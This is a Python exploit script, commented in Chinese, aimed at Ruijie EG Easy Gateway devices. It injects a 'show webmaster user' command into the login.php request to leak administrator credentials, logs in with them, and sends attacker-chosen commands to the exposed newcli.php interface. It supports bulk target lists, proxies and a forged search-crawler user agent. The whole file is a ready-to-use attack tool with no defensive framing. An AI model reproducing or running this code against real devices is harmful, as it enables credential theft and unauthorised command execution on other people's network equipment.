import argparse
import json

from user_agent import get_user_agent_pc
import requests
import os
import random
import string

MIN_VARIABLE_NUM = 1
MAX_VARIABLE_NUM = 10
MAX_LENGTH = 10
requests.packages.urllib3.disable_warnings()
proxies = None
headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}
proxies = None
timeout = None
delay = None
xml_request_headers = None
thread = None


# 1 访问目标站点
# 1.1 GET 访问目标站点
def _get_request(url: str) -> (int, requests.Response or str):
    try:
        res = requests.get(url=url, timeout=timeout, headers=headers, proxies=proxies, verify=False)
        return 200, res
    except Exception as e:
        return 500, f"[!]无法正常访问{url}"


# 1.2 POST 访问目标站点
def _post_request(_session: requests.Session, url: str, data: str) -> (int, requests.Response or str):
    try:
        res = _session.post(url=url, timeout=timeout, data=data,
                            headers=headers, proxies=proxies, verify=False)
        return 200, res
    except Exception as e:
        return 500, f"[!]无法正常访问{url}"


# 2. 获取页面内容
def _get_content(o: requests.Response, encoding: str = "UTF-8") -> str:
    _encoding = encoding if o.encoding is None or not o.encoding else o.encoding
    return o.content.decode(_encoding)


# 3. 生成随机访问密码
def create_random_variable_name(length: int, is_value: bool = False) -> tuple:
    _start = 0 if is_value else 1
    if length < 1 or length > MAX_LENGTH:
        if is_value:
            length = 1
        else:
            length = 2
    letters = string.ascii_letters
    nums_letters = string.ascii_letters + string.digits
    _prefix = ''.join(random.choice(letters) for _ in range(_start))
    _suffix = ''.join(random.choice(nums_letters) for _ in range(length))
    o = _prefix + _suffix
    return o, length


def create_random_variable_length() -> int:
    return random.randint(MIN_VARIABLE_NUM, MAX_VARIABLE_NUM)


def get_data_from_file(filename: str, mode: str) -> tuple:
    if not os.path.isabs(filename):
        filename = os.path.abspath(os.path.join(os.getcwd(), filename))
    if not os.path.isfile(filename):
        return "405", "{}不是一个合法文件".format(filename)
    if not os.path.exists(filename):
        return "404", "无法找到{}文件".format(filename)
    try:
        content = None
        with open(filename, mode=mode) as f:
            content = f.read().split()
        return "200", content
    except Exception as e:
        return "500", "打开{}文件时发生意料之外的错误".format(filename)


def get_data_brute_list(url_dict: dict) -> dict:
    brute_list = {
        'url': None
    }

    for key, value in url_dict.items():
        _type = value.get("type")
        if _type is None or not _type:
            continue
        if _type == "file":
            _value = value.get("value")
            code, res = get_data_from_file(_value, mode="r")
            if code != "200":
                print(res)
                continue
            brute_list[key] = res
        else:
            brute_list[key] = [value.get('value', None), ]

    return brute_list


def task(url_dict: dict, action: str = None, command: str = None):
    global proxies, headers, timeout, delay, thread, xml_request_headers
    brute_list = get_data_brute_list(url_dict)
    urls = brute_list.get('url', None)
    options = brute_list.get('options', None)[0]

    proxy = options.get('proxy', None)
    if proxy is None or not proxy:
        proxy = None
    else:
        os.environ['http_proxy'] = proxy

    proxies = {
        'http': proxy
    }

    headers.setdefault("User-Agent", options.get('user_agent', None))

    timeout = options.get('time_out', None)
    delay = options.get('delay', None)
    thread = options.get('thread', None)

    attack_url = "/login.php"
    cmd_url = "/newcli.php"

    xml_request_headers = headers
    xml_request_headers.setdefault('X-Requested-With', 'XMLHttpRequest')

    for url in urls:
        username, length = create_random_variable_name(create_random_variable_length(), is_value=True)
        password, length = create_random_variable_name(create_random_variable_length(), is_value=True)
        data = f"username={username}&password={password}?show+webmaster+user"
        _session = requests.session()
        url = url[:-1] if url.endswith("/") else url
        code, res = _post_request(_session, url + attack_url, data)
        if code != 200:
            continue
        content = _get_content(res)
        code, content = prcess_json_data(content)
        if code != 200:
            continue
        data = f"username={content.get('username', 'admin')}&password={content.get('password', 'admin')}"
        code, res = _post_request(_session, url + attack_url, data)
        if code != 200:
            continue
        print(f"{url}的账号/密码可能是: {content.get('username', '')} | {content.get('password', '')}")
        content = _get_content(res)
        data = json.loads(content)
        if str(data.get('data', '0')) == '0' and str(data.get('status', '0')) == '1':
            print(f"{url} 能够成功登录，")
        code, content = run_switch_command(_session, url + cmd_url, action=action, command=command)
        if code != 200:
            continue
        print(content)


def run_switch_command(_session: requests.Session, url: str, action: str = None, command: str = None, encoding: str = 'UTF-8') -> (int, str):
    action = input("Please input the action(such as exec):") if action is None or not action else action
    command = input("Please input the command(such as ?):") if command is None or not command else command
    cmd_data = f"mode_url={action}&command={command}"
    global xml_request_headers, proxies, timeout
    try:
        res = _session.post(url, data=cmd_data, headers=xml_request_headers, proxies=proxies, timeout=timeout)
        encoding = res.encoding if res.encoding else encoding
        return 200, res.content.decode(encoding)
    except Exception as e:
        return 500, f"{url}页面命令执行失败"


def prcess_json_data(content: str) -> (int, dict or str):
    try:
        data = json.loads(content)
        user = data.get('data', None)
        if user is None or not user:
            return 404, "找不到账号密码相关数据"
        res = user.split(" ")
        return 200, {
            "username": res[-2],
            "password": res[-1]
        }
    except json.decoder.JSONDecodeError as l_e:
        return 403, "解析文本失败，可能是内容类型发生错误"
    except Exception as e:
        return 500, "解析文本失败，，解析过程中出现异常"


def set_cmd_arg() -> any:
    description = 'Ruijie EG Easy Gateway newcli.php Execution Switch Command Interface Exposed'
    parser = argparse.ArgumentParser(description=description, add_help=True)

    targets = parser.add_mutually_exclusive_group(required=True)
    targets.add_argument('-u', '--url', type=str, help='Enter target object')
    targets.add_argument("-f", '--file', type=str, help='Input target object file')

    parser.add_argument('--random-agent', type=bool,
                        required=False, help='Using random user agents')
    parser.add_argument('--time-out', type=int,
                        required=False, help='Set the HTTP access timeout range (setting range from 0 to 5)')
    parser.add_argument('-d', '--delay', type=int,
                        required=False, help='Set multi threaded access latency (setting range from 0 to 5)')
    parser.add_argument('-t', '--thread', type=int,
                        required=False, help='Set the number of program threads (setting range from 1 to 50)')
    parser.add_argument('--proxy', type=str,
                        required=False, help='Set up HTTP proxy')

    args = parser.parse_args()
    return args


def parse_cmd_args(args) -> dict:
    o = dict()
    if args.url is None or not args.url:
        o.setdefault('url', {'type': 'file', 'value': args.file})
    else:
        o.setdefault('url', {'type': 'str', 'value': args.url})

    options = dict()
    if args.random_agent is not None and args.random_agent:
        user_agent = get_user_agent_pc()
    else:
        user_agent = "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
    options.setdefault('user_agent', user_agent)

    time_out = 1
    base_time_out = random.randint(1, 5)
    if args.time_out is not None:
        if args.time_out < 0 or args.time_out > 5:
            time_out = 0
        else:
            time_out = args.time_out
    options.setdefault('time_out', (base_time_out, base_time_out + time_out))

    options.setdefault('delay', args.delay if args.delay is not None else 0)
    options.setdefault('thread', args.delay if args.thread is not None else 0)
    options.setdefault('proxy', args.proxy if args.proxy is not None else None)

    o.setdefault('options', {"type": "str", "value": options})

    return o


def main() -> None:
    args = set_cmd_arg()
    obj = parse_cmd_args(args)
    task(obj)


if __name__ == '__main__':
    main()
